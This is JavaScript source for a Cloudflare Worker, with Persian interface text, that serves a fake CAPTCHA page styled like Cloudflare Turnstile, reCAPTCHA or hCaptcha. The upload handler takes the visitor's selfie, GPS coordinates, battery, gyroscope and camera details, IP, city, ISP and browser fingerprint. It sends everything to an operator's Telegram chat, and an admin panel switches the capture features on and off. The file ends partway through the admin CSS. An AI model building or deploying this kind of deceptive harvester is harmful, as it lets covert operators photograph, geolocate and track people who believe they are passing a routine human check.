// ============================================================
//  Selfie Captcha Worker — v10
// ============================================================

const UI_MODES = [
  { id: 'cloudflare', icon: '🛡️', title: 'Cloudflare', desc: 'شبیه Turnstile' },
  { id: 'classic',    icon: '📄', title: 'کلاسیک',     desc: 'سادهٔ فارسی' },
  { id: 'google',     icon: '🔎', title: 'Google',     desc: 'شبیه reCAPTCHA' },
  { id: 'hcaptcha',   icon: '🔮', title: 'hCaptcha',   desc: 'شبیه hCaptcha' },
  { id: 'minimal',    icon: '◻️', title: 'مینیمال',    desc: 'بدون تزئین' },
];
const UI_IDS = UI_MODES.map((m) => m.id);

export default {
  async fetch(request, env, ctx) {
    try {
      const url = new URL(request.url);
      if (url.pathname === '/') {
        if (request.method !== 'GET') return methodNotAllowed(['GET']);
        return await handlePage(request, env);
      }
      if (url.pathname === '/upload') {
        if (request.method !== 'POST') return methodNotAllowed(['POST']);
        return await handleUpload(request, env, ctx);
      }
      if (url.pathname === '/on' || url.pathname === '/off') {
        if (request.method !== 'POST') return methodNotAllowed(['POST']);
        return await handleToggle(request, env, 'selfie', url.pathname === '/on' ? 'on' : 'off');
      }
      if (url.pathname === '/geo/on' || url.pathname === '/geo/off') {
        if (request.method !== 'POST') return methodNotAllowed(['POST']);
        return await handleToggle(request, env, 'geo', url.pathname === '/geo/on' ? 'on' : 'off');
      }
      if (url.pathname === '/state') {
        if (request.method !== 'GET') return methodNotAllowed(['GET']);
        return json({
          site: await getState(env, 'site', 'on'),
          selfie: await getState(env, 'selfie', 'on'),
          geo: await getState(env, 'geo', 'off'),
          ui: await getState(env, 'ui', 'cloudflare', UI_IDS),
          redirect: await getState(env, 'redirect', '', null),
        });
      }
      const adminBase = getAdminBase(env);
      if (adminBase && (url.pathname === adminBase || url.pathname.startsWith(adminBase + '/'))) {
        const sub = url.pathname === adminBase ? '' : url.pathname.slice(adminBase.length + 1);
        return await handleAdmin(request, env, sub, adminBase);
      }
      return new Response('Not Found', { status: 404 });
    } catch (err) {
      console.error('unhandled', err?.stack || err);
      return json({ error: 'internal_error' }, 500);
    }
  },
};

function getAdminBase(env) {
  const p = env.ADMIN_PATH || env.ADMIN_TOKEN;
  if (!p) return null;
  const c = String(p).replace(/^\/+|\/+$/g, '');
  return c ? '/' + c : null;
}
function getAdminPassword(env) { return env.ADMIN_PASSWORD || env.ADMIN_TOKEN || ''; }

const RECENT_LOG_KEY = 'recent_log';
const RECENT_LOG_MAX = 20;

async function getState(env, key, def = 'on', valid = ['on', 'off']) {
  if (env.SELFIE_STATE) {
    try {
      const v = await env.SELFIE_STATE.get(key);
      if (v != null && (valid === null || valid.includes(v))) return v;
    } catch (e) { console.error('kv get failed', e); }
  }
  try {
    const cache = caches.default;
    const hit = await cache.match(new Request(`https://selfie-state.local/${key}`));
    if (hit) {
      const v = await hit.text();
      if (valid === null || valid.includes(v)) return v;
    }
  } catch {}
  return def;
}

async function setRawState(env, key, value) {
  const v = String(value ?? '');
  if (env.SELFIE_STATE) {
    if (v === '') await env.SELFIE_STATE.delete(key);
    else await env.SELFIE_STATE.put(key, v);
    return { ok: true, storage: 'kv', key, value: v };
  }
  const cache = caches.default;
  await cache.put(new Request(`https://selfie-state.local/${key}`),
    new Response(v, { headers: { 'Cache-Control': 'public, max-age=31536000' } }));
  return { ok: true, storage: 'cache', key, value: v };
}

async function setState(env, key, state) {
  const value = state === 'off' ? 'off' : 'on';
  const r = await setRawState(env, key, value);
  if (r.storage === 'cache') r.warning = 'KV not bound — per-colo only';
  return r;
}

async function getRecentLog(env) {
  if (!env.SELFIE_STATE) return [];
  try {
    const raw = await env.SELFIE_STATE.get(RECENT_LOG_KEY);
    if (!raw) return [];
    const arr = JSON.parse(raw);
    return Array.isArray(arr) ? arr : [];
  } catch { return []; }
}

async function logSubmission(env, entry) {
  if (!env.SELFIE_STATE) return;
  try {
    const raw = await env.SELFIE_STATE.get(RECENT_LOG_KEY);
    let log = [];
    if (raw) { try { log = JSON.parse(raw); } catch {} }
    if (!Array.isArray(log)) log = [];
    log.unshift(entry);
    if (log.length > RECENT_LOG_MAX) log.length = RECENT_LOG_MAX;
    await env.SELFIE_STATE.put(RECENT_LOG_KEY, JSON.stringify(log));
  } catch (e) { console.error('log failed', e); }
}

function adminSessionKey(env) { return `admin|${env.ADMIN_TOKEN || ''}|${env.ADMIN_PASSWORD || ''}`; }

async function issueAdminSession(env) {
  const payload = btoa(String(Date.now()));
  const sig = await hmac(payload, adminSessionKey(env));
  return `${payload}.${sig}`;
}

async function verifyAdminSession(token, env, maxAgeMs = 12 * 3600_000) {
  if (!token || !env.ADMIN_TOKEN) return false;
  try {
    const [payload, sig] = String(token).split('.');
    if (!payload || !sig) return false;
    const expected = await hmac(payload, adminSessionKey(env));
    if (expected.length !== sig.length) return false;
    let diff = 0;
    for (let i = 0; i < expected.length; i++) diff |= expected.charCodeAt(i) ^ sig.charCodeAt(i);
    if (diff !== 0) return false;
    const ts = Number(atob(payload));
    return Number.isFinite(ts) && Date.now() - ts <= maxAgeMs;
  } catch { return false; }
}

const timingSafeEqual = (a, b) => {
  const A = String(a ?? ''), B = String(b ?? '');
  if (A.length !== B.length) return false;
  let d = 0;
  for (let i = 0; i < A.length; i++) d |= A.charCodeAt(i) ^ B.charCodeAt(i);
  return d === 0;
};

async function handleToggle(request, env, feature, action) {
  if (!env.ADMIN_TOKEN) return json({ error: 'admin_disabled' }, 403);
  const url = new URL(request.url);
  const provided = url.searchParams.get('token') || request.headers.get('X-Admin-Token') || '';
  if (!timingSafeEqual(provided, env.ADMIN_TOKEN)) return json({ error: 'unauthorized' }, 401);
  return json(await setState(env, feature, action));
}

async function handleAdmin(request, env, sub, adminBase) {
  const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
  const url = new URL(request.url);
  const nonce = crypto.randomUUID().replace(/-/g, '');
  const authed = await verifyAdminSession(parseCookie(request.headers.get('Cookie') || '', 'admin_sess'), env);

  if (request.method === 'GET' && sub === '') {
    if (authed) {
      const [site, selfie, geo, ui, redir, log] = await Promise.all([
        getState(env, 'site', 'on'),
        getState(env, 'selfie', 'on'),
        getState(env, 'geo', 'off'),
        getState(env, 'ui', 'cloudflare', UI_IDS),
        getState(env, 'redirect', '', null),
        getRecentLog(env),
      ]);
      return adminResponse(
        renderAdminDashboard(nonce, adminBase, site, selfie, geo, ui, redir, env, request.cf || {}, log, url.searchParams),
        nonce);
    }
    return adminResponse(renderAdminLogin(nonce, adminBase, url.searchParams), nonce);
  }

  if (request.method === 'POST' && sub === 'login') {
    const rl = await rateLimit('adminlogin:' + ip, 5, 60);
    if (!rl.allowed) return redirect(adminBase + '?err=rate');
    let password = '';
    try { const f = await request.formData(); password = String(f.get('password') || ''); } catch {}
    const expected = getAdminPassword(env);
    if (!expected || !timingSafeEqual(password, expected)) {
      await sleep(300);
      return redirect(adminBase + '?err=invalid');
    }
    const token = await issueAdminSession(env);
    return redirect(adminBase + '?ok=login', 303, {
      'Set-Cookie': `admin_sess=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=43200; Secure`,
    });
  }

  if (request.method === 'POST' && sub === 'logout') {
    return redirect(adminBase, 303, {
      'Set-Cookie': 'admin_sess=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0; Secure',
    });
  }

  if (request.method === 'POST' && sub === 'toggle') {
    if (!authed) return redirect(adminBase);
    let feature = '', desired = '';
    try { const f = await request.formData(); feature = String(f.get('feature') || ''); desired = String(f.get('state') || ''); } catch {}
    if (!['selfie', 'geo'].includes(feature) || !['on', 'off'].includes(desired)) return redirect(adminBase + '?err=state');
    await setState(env, feature, desired);
    return redirect(`${adminBase}?ok=toggled&feature=${feature}&state=${desired}`, 303);
  }

  if (request.method === 'POST' && sub === 'set-site') {
    if (!authed) return redirect(adminBase);
    let desired = '';
    try { const f = await request.formData(); desired = String(f.get('state') || ''); } catch {}
    if (!['on', 'off'].includes(desired)) return redirect(adminBase + '?err=state');
    await setState(env, 'site', desired);
    return redirect(`${adminBase}?ok=site&state=${desired}`, 303);
  }

  if (request.method === 'POST' && sub === 'set-ui') {
    if (!authed) return redirect(adminBase);
    let mode = '';
    try { const f = await request.formData(); mode = String(f.get('mode') || ''); } catch {}
    if (!UI_IDS.includes(mode)) return redirect(adminBase + '?err=ui');
    await setRawState(env, 'ui', mode);
    return redirect(adminBase + '?ok=ui&mode=' + mode, 303);
  }

  if (request.method === 'POST' && sub === 'set-redirect') {
    if (!authed) return redirect(adminBase);
    let u = '';
    try { const f = await request.formData(); u = String(f.get('url') || '').trim(); } catch {}
    if (u && (!/^https?:\/\//i.test(u) || u.length > 2000)) return redirect(adminBase + '?err=url');
    await setRawState(env, 'redirect', u);
    return redirect(adminBase + '?ok=redirect', 303);
  }

  return new Response('Not Found', { status: 404 });
}

async function handlePage(request, env) {
  const siteMode = await getState(env, 'site', 'on');
  if (siteMode === 'off') {
    return new Response(
      '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="robots" content="noindex"><title></title></head><body style="margin:0;min-height:100vh;background:#fff"></body></html>',
      { headers: { 'Content-Type': 'text/html;charset=UTF-8', 'Cache-Control': 'no-store' } });
  }
  const secret = env.SESSION_SECRET || env.TELEGRAM_BOT_TOKEN;
  const token = await issueToken(secret);
  const nonce = crypto.randomUUID().replace(/-/g, '');
  const [selfieState, geoState, uiMode, redirectUrl] = await Promise.all([
    getState(env, 'selfie', 'on'),
    getState(env, 'geo', 'off'),
    getState(env, 'ui', 'cloudflare', UI_IDS),
    getState(env, 'redirect', '', null),
  ]);
  const headers = new Headers({
    'Content-Type': 'text/html;charset=UTF-8',
    'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'Referrer-Policy': 'no-referrer',
    'Permissions-Policy': 'camera=(self), microphone=(), geolocation=(self), accelerometer=(self), gyroscope=(self), magnetometer=(self)',
    'Content-Security-Policy': [
      "default-src 'none'", `script-src 'nonce-${nonce}'`, `style-src 'nonce-${nonce}'`,
      "connect-src 'self'", "img-src 'self' data: blob:", "media-src 'self' blob:",
      "base-uri 'none'", "form-action 'none'", "frame-ancestors 'none'",
    ].join('; '),
  });
  headers.set('Set-Cookie', `hs_session=${token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=300; Secure`);
  return new Response(renderUI(uiMode, nonce, selfieState, geoState, redirectUrl), { headers });
}

function renderUI(mode, nonce, selfieState, geoState, redirectUrl) {
  const s = selfieState === 'off' ? 'off' : 'on';
  const g = geoState === 'on' ? 'on' : 'off';
  switch (mode) {
    case 'classic':  return renderClassicHTML(nonce, s, g, redirectUrl);
    case 'google':   return renderGoogleHTML(nonce, s, g, redirectUrl);
    case 'hcaptcha': return renderHcaptchaHTML(nonce, s, g, redirectUrl);
    case 'minimal':  return renderMinimalHTML(nonce, s, g, redirectUrl);
    default:         return renderCloudflareHTML(nonce, s, g, redirectUrl);
  }
}

async function handleUpload(request, env, ctx) {
  if ((await getState(env, 'site', 'on')) === 'off') return json({ error: 'site_disabled' }, 503);
  const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
  const secret = env.SESSION_SECRET || env.TELEGRAM_BOT_TOKEN;
  const rl = await rateLimit(ip, Number(env.RATE_LIMIT_PER_MIN) || 5, 60);
  if (!rl.allowed) return json({ error: 'rate_limited' }, 429);
  const token = parseCookie(request.headers.get('Cookie') || '', 'hs_session');
  if (!token || !(await verifyToken(token, secret))) return json({ error: 'invalid_session' }, 403);
  let form;
  try { form = await request.formData(); } catch { return json({ error: 'invalid_multipart' }, 400); }
  const selfieMode = await getState(env, 'selfie', 'on');
  const geoMode = await getState(env, 'geo', 'off');
  const photo = form.get('photo');
  const clientDataRaw = form.get('clientData');
  if (selfieMode === 'on') {
    if (!(photo instanceof File)) return json({ error: 'missing_photo' }, 400);
    const maxBytes = Number(env.MAX_UPLOAD_BYTES) || 5 * 1024 * 1024;
    if (photo.size === 0) return json({ error: 'empty_photo' }, 400);
    if (photo.size > maxBytes) return json({ error: 'photo_too_large' }, 413);
    if (!/^image\/(jpeg|png|webp)$/.test(photo.type)) return json({ error: 'invalid_mime' }, 415);
  }
  let clientInfo = {};
  try { clientInfo = JSON.parse(clientDataRaw || '{}'); } catch { clientInfo = { _parseError: 'invalid json' }; }
  const cf = request.cf || {};
  const serverInfo = {
    ip, country: cf.country, countryName: cf.countryName, continent: cf.continent, city: cf.city,
    region: cf.region, regionCode: cf.regionCode, postalCode: cf.postalCode,
    latitude: cf.latitude, longitude: cf.longitude, timezone: cf.timezone, isEUCountry: cf.isEUCountry,
    isp: cf.asOrganization, asn: cf.asn, metroCode: cf.metroCode,
    httpProtocol: cf.httpProtocol, tlsVersion: cf.tlsVersion, tlsCipher: cf.tlsCipher,
    clientTcpRtt: cf.clientTcpRtt, colo: cf.colo,
    userAgent: request.headers.get('User-Agent'), acceptLanguage: request.headers.get('Accept-Language'),
    acceptEncoding: request.headers.get('Accept-Encoding'), referer: request.headers.get('Referer'),
    botScore: cf.botManagement?.score, verifiedBot: cf.botManagement?.verifiedBot,
  };
  const sessionId = crypto.randomUUID().slice(0, 8);
  const reportHtml = buildReport(sessionId, serverInfo, clientInfo, selfieMode, geoMode);
  const tg = new TelegramClient(env.TELEGRAM_BOT_TOKEN, env.TELEGRAM_CHAT_ID);
  const results = [];
  if (selfieMode === 'on' && photo instanceof File) {
    const r = await tg.sendPhoto(photo, `📸 <b>سلفی دریافتی</b>\nشناسه: <code>${sessionId}</code>`);
    results.push({ step: 'photo', ok: !!r.ok });
  }
  for (const [i, chunk] of chunkByLines(reportHtml).entries()) {
    const r = await tg.sendMessage(chunk);
    results.push({ step: `report_${i + 1}`, ok: !!r.ok });
    await sleep(300);
  }
  const rawJson = JSON.stringify({ sessionId, at: new Date().toISOString(), selfieMode, geoMode, serverInfo, clientInfo }, null, 2);
  const docRes = await tg.sendDocument(new Blob([rawJson], { type: 'application/json' }),
    `data_${sessionId}.json`,
    `📄 داده خام • <code>${sessionId}</code> • سلفی: <b>${selfieMode}</b> • موقعیت: <b>${geoMode}</b>`);
  results.push({ step: 'raw_json', ok: !!docRes.ok });
  if (ctx && ctx.waitUntil) {
    const geo = clientInfo.geolocation || {};
    ctx.waitUntil(logSubmission(env, {
      ts: Date.now(), sessionId, ip,
      country: cf.country || null, city: cf.city || null,
      selfieMode, geoMode,
      lat: geo.success ? geo.latitude : null,
      lon: geo.success ? geo.longitude : null,
      accuracy: geo.success ? Math.round(geo.accuracy) : null,
      ua: String(request.headers.get('User-Agent') || '').slice(0, 80),
    }));
  }
  if (!results.some((r) => r.ok)) return json({ error: 'telegram_failed', results }, 502);
  return json({ ok: true, sessionId, selfieMode, geoMode, results });
}

class TelegramClient {
  constructor(token, chatId) { this.token = token; this.chatId = chatId; this.base = `https://api.telegram.org/bot${token}`; }
  sendPhoto(blob, caption) {
    const fd = new FormData();
    fd.append('chat_id', this.chatId);
    fd.append('photo', blob, 'selfie.jpg');
    fd.append('caption', caption);
    fd.append('parse_mode', 'HTML');
    return this._call('sendPhoto', fd);
  }
  sendMessage(text) {
    return this._call('sendMessage', JSON.stringify({
      chat_id: this.chatId, text, parse_mode: 'HTML', disable_web_page_preview: true,
    }), { 'Content-Type': 'application/json' });
  }
  sendDocument(blob, filename, caption) {
    const fd = new FormData();
    fd.append('chat_id', this.chatId);
    fd.append('document', blob, filename);
    fd.append('caption', caption);
    fd.append('parse_mode', 'HTML');
    return this._call('sendDocument', fd);
  }
  async _call(method, body, headers = {}) {
    try {
      const res = await fetch(`${this.base}/${method}`, { method: 'POST', headers, body });
      const data = await res.json();
      if (!data.ok) console.error(`telegram ${method}`, data);
      return data;
    } catch (e) { console.error(`telegram ${method} exception`, e); return { ok: false, description: String(e) }; }
  }
}

function buildReport(sessionId, server, client, selfieMode, geoMode) {
  const esc = escapeHtml;
  const cam = client.camera || {}, frame = client.capturedFrame || {};
  const orientation = client.orientation || {}, battery = client.battery || {}, geo = client.geolocation || {};
  const zoom = cam.zoom, iso = cam.iso;
  const when = client.utcTime || client.localTime || new Date().toISOString();
  let geoBlock;
  if (geoMode === 'off') geoBlock = '<pre>🔒 غیرفعال — توسط ادمین خاموش شده</pre>';
  else if (geo.skipped) geoBlock = '<pre>درخواست نشد</pre>';
  else if (!geo.supported) geoBlock = '<pre>مرورگر پشتیبانی نمی‌کند</pre>';
  else if (geo.success) {
    const lat = fmtCoord(geo.latitude), lon = fmtCoord(geo.longitude);
    const mapUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
    geoBlock = `<pre>مختصات:     ${lat}, ${lon}
دقت:         ${Math.round(geo.accuracy)} متر (${labelPrecision(geo.accuracy)})
ارتفاع:      ${geo.altitude != null ? Math.round(geo.altitude) + ' m' : '—'}
دقت ارتفاع:  ${geo.altitudeAccuracy != null ? Math.round(geo.altitudeAccuracy) + ' m' : '—'}
جهت:         ${geo.heading != null ? Math.round(geo.heading) + '°' : '—'}
سرعت:        ${geo.speed != null ? geo.speed.toFixed(2) + ' m/s' : '—'}
زمان ثبت:    ${new Date(geo.timestamp).toISOString()}</pre>
<a href="${esc(mapUrl)}">🗺 باز کردن در نقشه</a>`;
  } else geoBlock = `<pre>دریافت نشد: ${esc(geo.error || 'unknown')}${geo.message ? '\n' + esc(geo.message) : ''}</pre>`;
  const lines = [
    `🔐 <b>گزارش سلفی</b>`,
    `<i>شناسه:</i> <code>${sessionId}</code>`,
    `<i>سلفی:</i> ${selfieMode === 'on' ? '🟢 روشن' : '🔴 خاموش'} • <i>موقعیت:</i> ${geoMode === 'on' ? '🟢 روشن' : '🔴 خاموش'}`,
    `<i>زمان:</i> ${esc(when)}`, ``,
    `📍 <b>موقعیت دقیق (GPS)</b>`, geoBlock, ``,
    `🔋 <b>وضعیت باتری</b>`,
    battery.supported === false
      ? `<pre>در دسترس نیست (${esc(battery.reason || battery.error || 'unsupported')})</pre>`
      : `<pre>سطح:        ${battery.percent != null ? battery.percent + '%' : '—'}
شارژ:       ${battery.charging === true ? 'در حال شارژ ⚡' : battery.charging === false ? 'شارژ نمی‌شود' : '—'}
تا پر شدن:  ${fmtSeconds(battery.chargingTime)}
تا خالی:    ${fmtSeconds(battery.dischargingTime)}</pre>`, ``,
    `🧭 <b>وضعیت دستگاه (ژیروسکوپ)</b>`,
    orientation.supported === false
      ? `<pre>پشتیبانی نمی‌شود (${esc(orientation.reason || 'unknown')})</pre>`
      : orientation.average
        ? `<pre>وضعیت:      ${esc(orientation.posture || '—')}
Alpha (Z):  ${fmtNum(orientation.average.alpha)}°
Beta  (X):  ${fmtNum(orientation.average.beta)}°
Gamma (Y):  ${fmtNum(orientation.average.gamma)}°
صفحه:       ${esc(orientation.screenOrientation?.type || '—')} (${esc(orientation.screenOrientation?.angle ?? '—')}°)
نمونه‌ها:   ${esc(orientation.sampleCount || 0)}</pre>`
        : `<pre>داده‌ای دریافت نشد (${esc(orientation.note || 'no_data')})</pre>`, ``,
    `🌐 <b>اطلاعات شبکه</b>`,
    `<pre>IP:          ${esc(server.ip)}
کشور:       ${esc(server.country)} (${esc(server.countryName)})
قاره:       ${esc(server.continent)}
شهر:        ${esc(server.city)}
منطقه:      ${esc(server.region)} / ${esc(server.regionCode)}
کدپستی:     ${esc(server.postalCode)}
مختصات:     ${esc(server.latitude)}, ${esc(server.longitude)}
منطقه زمان: ${esc(server.timezone)}
EU:         ${server.isEUCountry === '1' ? 'بله' : 'خیر'}
ISP:        ${esc(server.isp)}
ASN:        ${esc(server.asn)}
MetroCode:  ${esc(server.metroCode)}
HTTP:       ${esc(server.httpProtocol)}
TLS:        ${esc(server.tlsVersion)} / ${esc(server.tlsCipher)}
RTT:        ${esc(server.clientTcpRtt)} ms
Colo:       ${esc(server.colo)}</pre>`,
    `UA: <code>${esc(server.userAgent)}</code>`,
    `Lang: ${esc(server.acceptLanguage)}`,
    `Encoding: ${esc(server.acceptEncoding)}`,
    `Referer: ${esc(server.referer)}`,
    `BotScore: ${esc(server.botScore ?? '—')}`, ``,
    `📷 <b>اطلاعات دوربین</b>`,
    selfieMode === 'on'
      ? `<pre>نوع:         ${esc(cam.facingMode || '—')}
رزولوشن:     ${esc(cam.width || '?')}×${esc(cam.height || '?')}
فریم ریت:    ${esc(cam.frameRate || '?')} fps
نسبت:        ${esc(cam.aspectRatio || '—')}
Focus:       ${esc(cam.focusMode || '—')}
Exposure:    ${esc(cam.exposureMode || '—')}
WB:          ${esc(cam.whiteBalanceMode || '—')}
Torch:       ${cam.hasTorch ? 'دارد' : 'ندارد'}
Zoom:        ${zoom ? `${zoom.min}–${zoom.max}` : '—'}
ISO:         ${iso ? `${iso.min}–${iso.max}` : '—'}
دستگاه‌ها:    ${esc(cam.videoDeviceCount)} دوربین / ${esc(cam.audioDeviceCount)} میکروفن
فریم نهایی:  ${esc(frame.width || '?')}×${esc(frame.height || '?')} (${Math.round((frame.size || 0) / 1024)} KB)</pre>`
      : '<pre>غیرفعال — دوربین در حالت خاموش درخواست نشد</pre>',
    selfieMode === 'on' && cam.videoDeviceLabels && cam.videoDeviceLabels.length
      ? `<i>لیبل دستگاه‌ها:</i> ${esc(cam.videoDeviceLabels.join(' • '))}` : ``, ``,
    `💻 <b>اطلاعات مرورگر</b>`,
    `<pre>User-Agent: ${esc(client.userAgent)}
زبان:       ${esc(client.language)}
زبان‌ها:     ${esc((client.languages || []).join(', '))}
پلتفرم:     ${esc(client.platform)}
صفحه:       ${esc(client.screenWidth)}×${esc(client.screenHeight)}
پنجره:      ${esc(client.innerWidth)}×${esc(client.innerHeight)}
DPR:        ${esc(client.devicePixelRatio)}
CPU:        ${esc(client.hardwareConcurrency)} هسته
RAM:        ${esc(client.deviceMemory)} GB
اتصال:      ${esc(client.connectionType)}
زمان محلی:  ${esc(client.localTime)}
UTC:        ${esc(client.utcTime)}
TZ:         ${esc(client.timezone)}
آنلاین:     ${client.onLine ? 'بله' : 'خیر'}
کوکی:       ${client.cookieEnabled ? 'بله' : 'خیر'}
DNT:        ${esc(client.doNotTrack)}
PDF:        ${client.pdfViewerEnabled ? 'بله' : 'خیر'}</pre>`,
  ];
  return lines.filter(Boolean).join('\n');
}

const escapeHtml = (v) => String(v ?? '—').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
const fmtNum = (n, d = 1) => typeof n === 'number' && isFinite(n) ? n.toFixed(d) : '—';
const fmtCoord = (n) => typeof n === 'number' && isFinite(n) ? n.toFixed(6) : '—';
const fmtSeconds = (s) => {
  if (typeof s !== 'number' || !isFinite(s) || s <= 0) return '—';
  const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60);
  if (h > 0) return `${h} ساعت ${m} دقیقه`;
  if (m > 0) return `${m} دقیقه`;
  return `${Math.floor(s)} ثانیه`;
};
const labelPrecision = (acc) => {
  if (typeof acc !== 'number' || !isFinite(acc)) return '—';
  if (acc < 20) return 'عالی (GPS)';
  if (acc < 50) return 'بالا (GPS)';
  if (acc < 200) return 'متوسط (Wi-Fi)';
  if (acc < 1000) return 'پایین (شبکه)';
  return 'تقریبی (IP)';
};

async function issueToken(secret) {
  const payload = btoa(String(Date.now()));
  const sig = await hmac(payload, secret);
  return `${payload}.${sig}`;
}
async function verifyToken(token, secret, maxAgeMs = 5 * 60_000) {
  try {
    const [payload, sig] = String(token).split('.');
    if (!payload || !sig) return false;
    const expected = await hmac(payload, secret);
    if (expected.length !== sig.length) return false;
    let diff = 0;
    for (let i = 0; i < expected.length; i++) diff |= expected.charCodeAt(i) ^ sig.charCodeAt(i);
    if (diff !== 0) return false;
    const ts = Number(atob(payload));
    return Number.isFinite(ts) && Date.now() - ts <= maxAgeMs;
  } catch { return false; }
}
async function hmac(data, secret) {
  const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const buf = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(data));
  return btoa(String.fromCharCode(...new Uint8Array(buf))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
async function rateLimit(ip, limit, windowSec) {
  const cache = caches.default;
  const key = new Request(`https://ratelimit.local/${encodeURIComponent(ip)}`);
  const hit = await cache.match(key);
  const count = hit ? Number(await hit.text()) || 0 : 0;
  if (count >= limit) return { allowed: false, remaining: 0 };
  await cache.put(key, new Response(String(count + 1), { headers: { 'Cache-Control': `public, max-age=${windowSec}` } }));
  return { allowed: true, remaining: limit - count - 1 };
}
function parseCookie(header, name) {
  for (const part of header.split(';')) {
    const [k, ...rest] = part.trim().split('=');
    if (k === name) return rest.join('=');
  }
  return null;
}
function chunkByLines(text, size = 4000) {
  const out = []; let current = '';
  for (const line of text.split('\n')) {
    if (current && (current + '\n' + line).length > size) { out.push(current); current = line; }
    else current = current ? current + '\n' + line : line;
  }
  if (current) out.push(current);
  return out;
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const json = (obj, status = 200) => new Response(JSON.stringify(obj), {
  status, headers: { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' },
});
const methodNotAllowed = (allowed) => new Response('Method Not Allowed', {
  status: 405, headers: { Allow: allowed.join(', ') },
});
const redirect = (location, status = 302, extraHeaders = {}) => {
  const headers = new Headers({ Location: location, 'Cache-Control': 'no-store' });
  for (const [k, v] of Object.entries(extraHeaders)) headers.set(k, v);
  return new Response(null, { status, headers });
};
function adminResponse(html, nonce) {
  return new Response(html, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8',
      'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'Content-Security-Policy': [
        "default-src 'none'", `script-src 'nonce-${nonce}'`, `style-src 'nonce-${nonce}'`,
        "connect-src 'self'", "img-src 'self' data:", "base-uri 'none'", "form-action 'self'", "frame-ancestors 'none'",
      ].join('; '),
    },
  });
}

// ============================================================
//  Admin CSS
// ============================================================
const ADMIN_CSS = `
  :root { --accent:#4a90e2; --ok:#22a06b; --ok-bg:#e8f7ef; --ok-border:#b7e6cd;
    --err:#d93636; --err-bg:#fdeaea; --err-border:#f3c2c2; --warn:#e07c2d; --warn-bg:#fdf3e8;
    --muted:#6b7280; --border:#dcdfe4; --bg:#f5f6f8; --text:#1f2328; }
  * { box-sizing: border-box; }
  html, body { margin: 0; min-height: 100%; }
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    background: var(--bg); color: var(--text); padding: 16px; display: flex; align-items: flex-start; justify-content: center; }
  .wrap { width: 100%; max-width: 680px; }
  .card { background:#fff; border:1px solid var(--border); border-radius:14px;
    box-shadow: 0 6px 24px rgba(15,23,42,.06); padding: 20px; }
  h1 { font-size:18px; margin:0; }
  h2 { font-size:15px; margin: 0 0 12px; }
  .subtitle { color: var(--muted); font-size:13px; margin: 4px 0 18px; }
  .alert { padding: 10px 12px; border-radius: 8px; font-size: 13px; margin-bottom: 14px; }
  .alert.err { background: var(--err-bg); color: var(--err); }
  .alert.ok  { background: var(--ok-bg);  color: var(--ok); }
  input[type=password], input[type=url], input[type=text] { width: 100%; padding: 12px 14px; font-size: 15px;
    border: 1px solid var(--border); border-radius: 10px; background: #fff; color: var(--text); outline: none;
    transition: border-color .15s; font-family: inherit; }
  input[type=url], input[type=text] { font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    font-size: 13px; direction: ltr; text-align: left; }
  input:focus { border-color: var(--accent); }
  .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px;
    padding: 11px 16px; font-size: 14px; font-weight: 500; border: 1px solid var(--border);
    border-radius: 10px; background:#fff; color: var(--text); cursor:pointer; text-decoration:none;
    transition: all .15s; font-family: inherit; }
  .btn:hover { background: #f3f4f6; }
  .btn-primary { background: var(--accent); border-color: var(--accent); color:#fff; }
  .btn-primary:hover { filter: brightness(1.05); }
  .btn-danger { background: var(--err); border-color: var(--err); color:#fff; }
  .btn-danger:hover { filter: brightness(1.05); }
  .btn-success { background: var(--ok); border-color: var(--ok); color:#fff; }
  .btn-success:hover { filter: brightness(1.05); }
  .btn-block { width: 100%; }
  .btn-sm { padding: 7px 12px; font-size: 12px; }
  .login-icon { font-size: 36px; text-align:center; margin-bottom: 8px; }
  .login-card h1, .login-card .subtitle { text-align: center; }
  .row-between { display: flex; align-items: center; justify-content: space-between; gap: 12px; margin-bottom: 16px; }
  .toolbar { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; margin-bottom: 16px; }
  .site-card { padding: 20px; border-radius: 14px; border: 2px solid; margin-bottom: 20px; text-align: center; }
  .site-card.on { border-color: var(--ok-border); background: linear-gradient(135deg,#f7fdfa,#ecfaf1); }
  .site-card.off { border-color: var(--err-border); background: linear-gradient(135deg,#fefafa,#fdf0f0); }
  .site-badge { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
  .site-card.on .site-badge { color: var(--ok); }
  .site-card.off .site-badge { color: var(--err); }
  .site-hint { font-size: 13px; color: var(--muted); margin-bottom: 16px; line-height: 1.6; }
  .ui-options { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; margin-bottom: 8px; }
  .ui-form { margin: 0; }
  .ui-option { width: 100%; padding: 14px 10px; text-align: center; cursor: pointer;
    border: 2px solid var(--border); border-radius: 10px; background: #fff;
    transition: all .15s; font-family: inherit; color: inherit;
    display: flex; flex-direction: column; align-items: center; gap: 4px; }
  .ui-option:hover { border-color: var(--accent); background: #fafbfc; }
  .ui-option.active { border-color: var(--ok); background: var(--ok-bg); }
  .ui-option-icon { font-size: 22px; line-height: 1; }
